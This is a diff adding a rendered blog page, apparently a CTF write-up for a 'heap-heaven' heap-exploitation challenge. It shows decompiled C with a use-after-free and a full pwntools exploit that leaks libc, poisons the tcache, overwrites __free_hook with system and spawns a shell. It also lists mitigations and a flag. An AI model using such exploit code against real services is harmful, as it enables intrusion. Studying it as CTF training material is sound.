@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <title>heap-heaven - gracecondition</title>
+    <meta name="description" content="OS internals, binary exploitation, and low-level security research">
+
+    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    
+
+    
+</head>
+<body>
+    <div class="site-container">
+        <header class="site-header">
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="http://localhost:1313/" class="nav-brand">
+                <h1>gracecondition</h1>
+            </a>
+
+            <div class="nav-menu" id="nav-menu">
+                <a href="http://localhost:1313/" class="nav-link">Home</a>
+                <a href="/posts/" class="nav-link">Posts</a>
+                <a href="/ctf/" class="nav-link">CTF Solutions</a>
+                <a href="/about/" class="nav-link">About</a>
+            </div>
+
+            <div class="nav-toggle" id="nav-toggle">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+</header>
+
+        <main class="main-content">
+            
+<div class="content-with-toc">
+    <aside class="toc-sidebar">
+    <div class="toc-content">
+        
+        <div class="toc-section">
+            <h3 class="toc-title">📖 Contents</h3>
+            <nav class="toc-nav" id="toc-nav">
+                
+                <div class="toc-loading">Generating table of contents...</div>
+            </nav>
+        </div>
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Article Info</h4>
+            <div class="article-info">
+                <div class="info-item">
+                    <span class="info-label">Published:</span>
+                    <time class="info-value">Aug 12, 2024</time>
+                </div>
+                
+                <div class="info-item">
+                    <span class="info-label">Read time:</span>
+                    <span class="info-value">4 min</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Words:</span>
+                    <span class="info-value">710</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Category:</span>
+                    <span class="info-value category-ctf">Ctf</span>
+                </div>
+                
+            </div>
+        </div>
+
+        
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Challenge Details</h4>
+            <div class="challenge-info">
+                <div class="info-item">
+                    <span class="info-label">Category:</span>
+                    <span class="info-value challenge-category category-pwn">PWN</span>
+                </div>
+                
+                <div class="info-item">
+                    <span class="info-label">Points:</span>
+                    <span class="info-value">450</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Solves:</span>
+                    <span class="info-value">12</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">CTF:</span>
+                    <span class="info-value">DEF CON 31</span>
+                </div>
+                
+            </div>
+        </div>
+        
+
+        
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Tags</h4>
+            <div class="toc-tags">
+                
+                <a href="/tags/pwn/" class="toc-tag">#pwn</a>
+                
+                <a href="/tags/heap-exploitation/" class="toc-tag">#heap-exploitation</a>
+                
+                <a href="/tags/defcon31/" class="toc-tag">#defcon31</a>
+                
+                <a href="/tags/first-blood/" class="toc-tag">#first-blood</a>
+                
+            </div>
+        </div>
+        
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Progress</h4>
+            <div class="reading-progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                <div class="progress-text">
+                    <span id="progress-percentage">0%</span>
+                    <span class="progress-label">completed</span>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Related</h4>
+            <div class="related-posts">
+                
+                
+            </div>
+        </div>
+
+    </div>
+</aside>
+
+    <article class="single-post ctf-writeup">
+        <header class="post-header ctf-header">
+            <div class="ctf-meta">
+                <span class="ctf-badge">🚩 CTF Writeup</span>
+                
+                <span class="ctf-name">DEF CON 31</span>
+                
+            </div>
+
+            <h1 class="post-title-single">heap-heaven</h1>
+
+            <div class="ctf-challenge-info">
+                <div class="challenge-stats">
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Category:</span>
+                        <span class="stat-value category-pwn">PWN</span>
+                    </div>
+                    
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Points:</span>
+                        <span class="stat-value">450</span>
+                    </div>
+                    
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Solves:</span>
+                        <span class="stat-value">12</span>
+                    </div>
+                    
+                    
+                </div>
+                <div class="post-meta-single">
+                    <time datetime="2024-08-12">August 12, 2024</time>
+                    
+                    <span> • </span>
+                    <span>4 min read</span>
+                    
+                </div>
+            </div>
+        </header>
+
+        <div class="post-body ctf-content" id="post-content">
+            <h1 id="heap-heaven---def-con-31-ctf">heap-heaven - DEF CON 31 CTF</h1>
+<p><strong>Category</strong>: pwn
+<strong>Points</strong>: 450
+<strong>Solves</strong>: 12
+<strong>First Blood</strong>: ✅ eternalmarathon</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<pre tabindex="0"><code>Heaven is a place where memory allocations never fail and heap chunks are always perfectly aligned.
+Unfortunately, this isn&#39;t heaven.
+
+nc heap-heaven.ctf.defcon.org 31337
+</code></pre><p><strong>Files</strong>: <code>heap-heaven</code>, <code>libc.so.6</code></p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>Let&rsquo;s start by examining the binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file heap-heaven
+</span></span><span style="display:flex;"><span>heap-heaven: ELF 64-bit LSB executable, x86-64, dynamically linked, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>abc123, not stripped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ checksec heap-heaven
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/path/to/heap-heaven&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span><span style="display:flex;"><span>    RUNPATH:  <span style="color:#e6db74">&#39;.&#39;</span>
+</span></span></code></pre></div><p>The binary has all protections enabled, so we&rsquo;ll need to find a way around them.</p>
+<h2 id="static-analysis">Static Analysis</h2>
+<p>Opening the binary in Ghidra, we can see the main functionality:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    setup();
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Welcome to heap heaven!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        menu();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> choice <span style="color:#f92672">=</span> get_int();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span> (choice) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> allocate_chunk(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> free_chunk(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> edit_chunk(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span> view_chunk(); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span> exit(<span style="color:#ae81ff">0</span>); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span> puts(<span style="color:#e6db74">&#34;Invalid choice&#34;</span>); <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The key functions are:</p>
+<h3 id="allocate_chunk">allocate_chunk()</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">allocate_chunk</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> get_index();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (chunks[idx] <span style="color:#f92672">!=</span> NULL) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Chunk already allocated&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> size <span style="color:#f92672">=</span> get_int();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x500</span>) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Size too large&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    chunks[idx] <span style="color:#f92672">=</span> malloc(size);
+</span></span><span style="display:flex;"><span>    sizes[idx] <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Chunk allocated&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="free_chunk">free_chunk()</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">free_chunk</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> get_index();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (chunks[idx] <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Chunk not allocated&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    free(chunks[idx]);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// BUG: chunks[idx] not set to NULL!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    puts(<span style="color:#e6db74">&#34;Chunk freed&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="edit_chunk">edit_chunk()</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit_chunk</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> get_index();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (chunks[idx] <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Chunk not allocated&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    read(<span style="color:#ae81ff">0</span>, chunks[idx], sizes[idx]);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Chunk edited&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
+<p>The primary vulnerability is a <strong>Use-After-Free</strong> in the <code>free_chunk()</code> function. After calling <code>free()</code>, the pointer in the <code>chunks</code> array is not set to NULL, allowing us to:</p>
+<ol>
+<li>Edit freed chunks (leading to heap metadata corruption)</li>
+<li>View freed chunks (potential info leak)</li>
+<li>Double-free chunks</li>
+</ol>
+<h2 id="exploitation-strategy">Exploitation Strategy</h2>
+<p>Given the libc version (2.31), we can use the following approach:</p>
+<ol>
+<li><strong>Leak libc addresses</strong> using unsorted bin chunks</li>
+<li><strong>Tcache poisoning</strong> to gain arbitrary write</li>
+<li><strong>Overwrite <code>__free_hook</code></strong> with <code>system</code></li>
+<li><strong>Trigger shell</strong> by freeing a chunk containing &ldquo;/bin/sh&rdquo;</li>
+</ol>
+<h2 id="exploitation-implementation">Exploitation Implementation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Setup</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connection</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;heap-heaven.ctf.defcon.org&#39;</span>, <span style="color:#ae81ff">31337</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./heap-heaven&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Helper functions</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">allocate</span>(idx, size):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 1: Leak libc base</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 1: Leaking libc base address&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create chunks to prevent consolidation with top chunk</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x420</span>)  <span style="color:#75715e"># Large chunk for unsorted bin</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x20</span>)   <span style="color:#75715e"># Prevent consolidation</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20</span>)   <span style="color:#75715e"># Guard chunk</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Free large chunk to unsorted bin</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># View freed chunk to leak libc addresses</span>
+</span></span><span style="display:flex;"><span>view(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate libc base</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>  <span style="color:#75715e"># unsorted_bin offset for libc 2.31</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x55410</span>
+</span></span><span style="display:flex;"><span>free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1eee48</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;system: </span><span style="color:#e6db74">{</span>hex(system)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;__free_hook: </span><span style="color:#e6db74">{</span>hex(free_hook)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Tcache poisoning</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 2: Performing tcache poisoning&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate chunks for tcache poisoning</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Free chunks to fill tcache</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use-after-free to corrupt tcache linked list</span>
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">5</span>, p64(free_hook))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: Get arbitrary write</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 3: Getting arbitrary write primitive&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate to get back chunk 5</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate to get back chunk 4</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now allocate to get chunk at __free_hook</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write system address to __free_hook</span>
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">8</span>, p64(system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 4: Get shell</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 4: Getting shell&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate chunk with &#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">9</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Free chunk containing &#34;/bin/sh&#34; to trigger system(&#34;/bin/sh&#34;)</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Shell!</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="key-insights">Key Insights</h2>
+<ol>
+<li><strong>Use-After-Free vulnerabilities</strong> in heap managers can lead to powerful primitives</li>
+<li><strong>Tcache poisoning</strong> is effective against newer libc versions when you can corrupt tcache metadata</li>
+<li><strong>Modern heap exploitation</strong> requires careful management of heap state and understanding of allocator internals</li>
+<li><strong>First blood requires speed</strong> - having pre-written exploitation templates helps significantly</li>
+</ol>
+<h2 id="mitigation">Mitigation</h2>
+<p>The vulnerability could be prevented by:</p>
+<ul>
+<li>Setting pointers to NULL after freeing</li>
+<li>Implementing proper bounds checking</li>
+<li>Using memory-safe languages or smart pointers</li>
+<li>Enabling additional heap protections (e.g., GWP-ASan)</li>
+</ul>
+<hr>
+<p><strong>Flag</strong>: <code>DEF{h34p_h34v3n_1s_4c7u4lly_h311_f0r_d3v3l0p3rs}</code></p>
+
+        </div>
+
+        <footer class="post-footer">
+            
+            <div class="ctf-nav">
+                <a href="http://localhost:1313/ctf/defcon-31/" class="back-to-ctf">
+                    ← Back to DEF CON 31 CTF
+                </a>
+            </div>
+            
+        </footer>
+    </article>
+</div>
+
+        </main>
+
+        <footer class="site-footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <h3>gracecondition</h3>
+            <p>OS internals, binary exploitation, and low-level security research</p>
+        </div>
+
+        <div class="footer-section">
+            <h4>Quick Links</h4>
+            <ul>
+                <li><a href="/posts/">Posts</a></li>
+                <li><a href="/articles/">Articles</a></li>
+                <li><a href="/ctf/">CTF Solutions</a></li>
+                <li><a href="/about/">About</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section">
+            <h4>Connect</h4>
+            <div class="social-links">
+                
+                
+                
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <p>&copy; 2025 gracecondition. All rights reserved.</p>
+    </div>
+</footer>
+    </div>
+
+    <script src="http://localhost:1313/js/main.js"></script>
+    
+</body>
+</html>
